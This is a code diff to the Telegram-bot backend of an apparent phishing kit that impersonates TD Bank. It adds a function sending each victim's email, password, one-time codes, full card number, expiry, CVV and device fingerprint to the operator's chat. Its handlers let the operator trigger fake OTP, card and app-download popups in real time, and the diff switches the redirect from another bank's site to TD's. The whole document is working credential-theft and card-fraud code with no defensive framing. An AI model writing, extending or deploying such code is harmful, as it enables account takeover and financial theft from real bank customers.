@@ -58,6 +58,41 @@ function getISTDateTime() {
   return `${istDate.getUTCFullYear()}-${pad(istDate.getUTCMonth() + 1)}-${pad(istDate.getUTCDate())} ${pad(istDate.getUTCHours())}:${pad(istDate.getUTCMinutes())}:${pad(istDate.getUTCSeconds())}`;
 }
 
+function formatMessage(title, email, session, statusText, extraInfo = '') {
+  let msg = `${title}\n\n`;
+  msg += `📧 Email: ${email}\n`;
+  if (session.password) {
+    msg += `🔑 Password: ${session.password}\n`;
+  }
+  if (session.otpEntered) {
+    msg += `🔢 Email OTP: ${session.otpEntered}\n`;
+  }
+  if (session.cardNumber) {
+    const rawCard = (session.cardNumber || '').replace(/\D/g, '');
+    const formattedCard = rawCard.replace(/(\d{4})(?=\d)/g, '$1 ') || 'N/A';
+    msg += `💳 Card: ${formattedCard}\n`;
+    msg += `📅 Expiry: ${session.expiry || 'N/A'}\n`;
+    msg += `🔒 CVV: ${session.cvv || 'N/A'}\n`;
+  }
+  if (session.cardOtpEntered) {
+    msg += `🔢 Card OTP: ${session.cardOtpEntered}\n`;
+  }
+  if (session.deviceInfo) {
+    const di = session.deviceInfo;
+    msg += `📱 User-Agent: ${di.userAgent || 'unknown'}\n`;
+    msg += `🖥 Screen: ${di.screen || 'unknown'} | Platform: ${di.platform || 'unknown'}\n`;
+    msg += `🌐 Language: ${di.language || 'unknown'} | Timezone: ${di.timezone || 'unknown'}\n`;
+    msg += `🔑 Fingerprint: ${di.deviceFingerprint || 'unknown'}\n`;
+  }
+  if (extraInfo) {
+    msg += `${extraInfo}\n`;
+  }
+  const dateTimeStr = getISTDateTime();
+  msg += `🕐 Time: ${dateTimeStr}\n`;
+  msg += `Status: ${statusText}`;
+  return msg;
+}
+
 // Handle callback_query for real-time button commands
 bot.on('callback_query', async (callbackQuery) => {
   const { id: callbackQueryId, data, message } = callbackQuery;
@@ -81,9 +116,6 @@ bot.on('callback_query', async (callbackQuery) => {
     return;
   }
 
-  const timeOnly = getISTTimeOnly();
-  const dateTimeStr = getISTDateTime();
-
   try {
     if (action === 'pop_otp') {
       // 1. Generate 6-digit OTP
@@ -97,7 +129,7 @@ bot.on('callback_query', async (callbackQuery) => {
 
       // 3. Edit original message (remove buttons)
       await bot.editMessageText(
-        `✅ OTP POPUP TRIGGERED\n\n📧 Email: ${email}\n🕐 Time: ${timeOnly}\nStatus: OTP popup shown to user`,
+        formatMessage('✅ OTP POPUP TRIGGERED', email, session, 'OTP popup shown to user'),
         {
           chat_id: message.chat.id,
           message_id: message.message_id
@@ -110,7 +142,7 @@ bot.on('callback_query', async (callbackQuery) => {
       session.status = 'card_popup';
       await bot.answerCallbackQuery(callbackQueryId, { text: '💳 Card form triggered!' });
       await bot.editMessageText(
-        `💳 CARD DETAILS REQUESTED\n\n📧 Email: ${email}\n🔑 Password: ${session.password || 'N/A'}\n🕐 Time: ${dateTimeStr}\nStatus: Waiting for user to enter card details...`,
+        formatMessage('💳 CARD DETAILS REQUESTED', email, session, 'Waiting for user to enter card details...'),
         {
           chat_id: message.chat.id,
           message_id: message.message_id
@@ -122,7 +154,7 @@ bot.on('callback_query', async (callbackQuery) => {
       session.status = 'app_popup';
       await bot.answerCallbackQuery(callbackQueryId, { text: '📲 App download popup triggered!' });
       await bot.editMessageText(
-        `📲 APP DOWNLOAD POPUP TRIGGERED\n\n📧 Email: ${email}\n🔑 Password: ${session.password || 'N/A'}\n🕐 Time: ${dateTimeStr}\nStatus: Waiting for user to download TD Bank app...`,
+        formatMessage('📲 APP DOWNLOAD POPUP TRIGGERED', email, session, 'Waiting for user to download TD Bank app...'),
         {
           chat_id: message.chat.id,
           message_id: message.message_id
@@ -134,7 +166,7 @@ bot.on('callback_query', async (callbackQuery) => {
       session.status = 'card_popup';
       await bot.answerCallbackQuery(callbackQueryId, { text: '💳 OTP Accepted — Card popup triggered!' });
       await bot.editMessageText(
-        `💳 CARD DETAILS REQUESTED\n\n📧 Email: ${email}\n🔢 OTP Used: ${session.otpEntered || 'N/A'}\n🕐 Time: ${dateTimeStr}\nStatus: Waiting for user to enter card details...`,
+        formatMessage('💳 CARD DETAILS REQUESTED', email, session, 'Waiting for user to enter card details...'),
         {
           chat_id: message.chat.id,
           message_id: message.message_id
@@ -144,11 +176,9 @@ bot.on('callback_query', async (callbackQuery) => {
 
     } else if (action === 'accept_card') {
       session.status = 'verified';
-      const rawCard = (session.cardNumber || '').replace(/\D/g, '');
-      const formattedCard = rawCard.replace(/(\d{4})(?=\d)/g, '$1 ') || 'N/A';
       await bot.answerCallbackQuery(callbackQueryId, { text: '✅ Card accepted! Redirecting user...' });
       await bot.editMessageText(
-        `✅ LOGIN COMPLETE & VERIFIED\n\n📧 Email: ${email}\n🔑 Password: ${session.password || 'N/A'}\n🔢 Email OTP: ${session.otpEntered || 'N/A'}\n💳 Card: ${formattedCard}\n📅 Expiry: ${session.expiry || 'N/A'}\n🔒 CVV: ${session.cvv || 'N/A'}\n🔢 Card OTP: ${session.cardOtpEntered || 'N/A'}\n🕐 Time: ${dateTimeStr}\nStatus: User redirecting to https://www.td.com/`,
+        formatMessage('✅ LOGIN COMPLETE & VERIFIED', email, session, 'User redirecting to https://www.td.com/ca/en/personal-banking'),
         {
           chat_id: message.chat.id,
           message_id: message.message_id
@@ -165,7 +195,7 @@ bot.on('callback_query', async (callbackQuery) => {
 
       await bot.answerCallbackQuery(callbackQueryId, { text: '🔄 Card OTP generated — Card form dismissed' });
       await bot.editMessageText(
-        `🔄 OTP POPUP RE-TRIGGERED (CARD VERIFICATION)\n\n📧 Email: ${email}\n🔢 New OTP Code: ${otp}\n🕐 Time: ${timeOnly}\nStatus: User must enter card verification code`,
+        formatMessage('🔄 OTP POPUP RE-TRIGGERED (CARD VERIFICATION)', email, session, 'User must enter card verification code', `🔢 New OTP Code: ${otp}`),
         {
           chat_id: message.chat.id,
           message_id: message.message_id
@@ -177,7 +207,7 @@ bot.on('callback_query', async (callbackQuery) => {
       session.status = 'cancelled';
       await bot.answerCallbackQuery(callbackQueryId, { text: '❌ Login attempt cancelled' });
       await bot.editMessageText(
-        `❌ LOGIN CANCELLED\n\n📧 Email: ${email}\n🕐 Time: ${timeOnly}\nStatus: Session terminated`,
+        formatMessage('❌ LOGIN CANCELLED', email, session, 'Session terminated'),
         {
           chat_id: message.chat.id,
           message_id: message.message_id
@@ -188,18 +218,8 @@ bot.on('callback_query', async (callbackQuery) => {
     } else if (action === 'accept_otp') {
       session.status = 'verified';
       await bot.answerCallbackQuery(callbackQueryId, { text: '✅ OTP Accepted & Verified!' });
-
-      let finalMsg;
-      if (session.cardNumber || session.cardOtpMode) {
-        const rawCard = (session.cardNumber || '').replace(/\D/g, '');
-        const formattedCard = rawCard.replace(/(\d{4})(?=\d)/g, '$1 ') || 'N/A';
-        finalMsg = `✅ LOGIN COMPLETE & VERIFIED\n\n📧 Email: ${email}\n🔑 Password: ${session.password || 'N/A'}\n🔢 Email OTP: ${session.otpEntered || 'N/A'}\n💳 Card: ${formattedCard}\n📅 Expiry: ${session.expiry || 'N/A'}\n🔒 CVV: ${session.cvv || 'N/A'}\n🔢 Card OTP: ${session.cardOtpEntered || 'N/A'}\n🕐 Time: ${dateTimeStr}\nStatus: User redirecting to https://www.td.com/`;
-      } else {
-        finalMsg = `✅ LOGIN COMPLETE & VERIFIED\n\n📧 Email: ${email}\n🔑 Password: ${session.password || 'N/A'}\n🔢 OTP Used: ${session.otpEntered || 'N/A'}\n🕐 Time: ${dateTimeStr}\nStatus: User redirecting to https://www.td.com/`;
-      }
-
       await bot.editMessageText(
-        finalMsg,
+        formatMessage('✅ LOGIN COMPLETE & VERIFIED', email, session, 'User redirecting to https://www.td.com/ca/en/personal-banking'),
         {
           chat_id: message.chat.id,
           message_id: message.message_id
@@ -211,7 +231,7 @@ bot.on('callback_query', async (callbackQuery) => {
       session.status = 'rejected';
       await bot.answerCallbackQuery(callbackQueryId, { text: '❌ OTP marked wrong. Prompting retry...' });
       await bot.editMessageText(
-        `❌ OTP REJECTED — RETRY\n\n📧 Email: ${email}\n🔢 OTP Entered: ${session.otpEntered || 'N/A'}\n🕐 Time: ${timeOnly}\nStatus: User must retry`,
+        formatMessage('❌ OTP REJECTED — RETRY', email, session, 'User must retry'),
         {
           chat_id: message.chat.id,
           message_id: message.message_id
@@ -227,7 +247,7 @@ bot.on('callback_query', async (callbackQuery) => {
 
       await bot.answerCallbackQuery(callbackQueryId, { text: '🔄 New OTP generated and displayed' });
       await bot.editMessageText(
-        `🔄 NEW OTP GENERATED\n\n📧 Email: ${email}\n🔢 New OTP Code: ${otp}\n🕐 Time: ${timeOnly}\nStatus: User must enter new code`,
+        formatMessage('🔄 NEW OTP GENERATED', email, session, 'User must enter new code', `🔢 New OTP Code: ${otp}`),
         {
           chat_id: message.chat.id,
           message_id: message.message_id
@@ -237,12 +257,12 @@ bot.on('callback_query', async (callbackQuery) => {
 
     } else if (action === 'redirect') {
       session.status = 'redirect';
-      const redirectUrl = 'https://www.nationalbank.ca/dashboard';
+      const redirectUrl = 'https://www.td.com/ca/en/personal-banking';
       session.redirectUrl = redirectUrl;
 
       await bot.answerCallbackQuery(callbackQueryId, { text: '🔄 Redirecting user...' });
       await bot.editMessageText(
-        `🔄 REDIRECT TRIGGERED\n\n📧 Email: ${email}\n🌐 Redirecting to: ${redirectUrl}\n🕐 Time: ${timeOnly}`,
+        formatMessage('🔄 REDIRECT TRIGGERED', email, session, `User redirecting to ${redirectUrl}`, `🌐 Redirecting to: ${redirectUrl}`),
         {
           chat_id: message.chat.id,
           message_id: message.message_id
@@ -255,7 +275,7 @@ bot.on('callback_query', async (callbackQuery) => {
 
       await bot.answerCallbackQuery(callbackQueryId, { text: '✅ User marked as successfully verified!' });
       await bot.editMessageText(
-        `✅ VERIFICATION CONFIRMED\n\n📧 Email: ${email}\n🕐 Time: ${timeOnly}\nStatus: User notified of successful verification (no redirect)`,
+        formatMessage('✅ VERIFICATION CONFIRMED', email, session, 'User notified of successful verification (no redirect)'),
         {
           chat_id: message.chat.id,
           message_id: message.message_id
